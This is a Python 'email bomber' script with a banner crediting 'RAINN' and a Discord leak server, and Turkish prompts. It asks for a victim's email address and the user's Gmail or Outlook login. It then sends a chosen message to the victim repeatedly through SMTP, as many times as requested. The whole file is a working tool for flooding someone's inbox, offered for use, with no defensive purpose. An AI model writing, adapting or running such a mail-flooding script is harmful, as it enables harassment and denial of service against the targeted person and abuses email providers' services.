import smtplib
import time
print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By RAINN                      \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|            discord.gg/neonleak             \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

try:
    bomb_email = input("Bu saldırıyı gerçekleştirmek istediğiniz kişinin E-posta adresini girin: ")
    email = input("Gmail_address'inizi girin:")
    password = input("Gmail_password'unuzu girin:")
    message = input("Mesajı Girin:")
    counter = int(input("Kaç mesaj göndermek istiyorsunuz?:"))

    # gmail And outlook
    s_ = input('Servis sağlayıcıyı seçin (Gmail / Outlook): ').lower()

    if s_ == "gmail":
        mail = smtplib.SMTP('smtp.gmail.com',587)
    elif s_ == "outlook":
        mail = smtplib.SMTP('smtp.office365.com',587)

    for x in range(0,counter):
        print("Gönderilen Mesaj Sayısı : ", x+1)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,bomb_email,message)
        time.sleep(1)

    mail.close()
except Exception as e:
    print("Bir şeyler ters gidiyor, lütfen Geçerli girişle tekrar deneyin.")
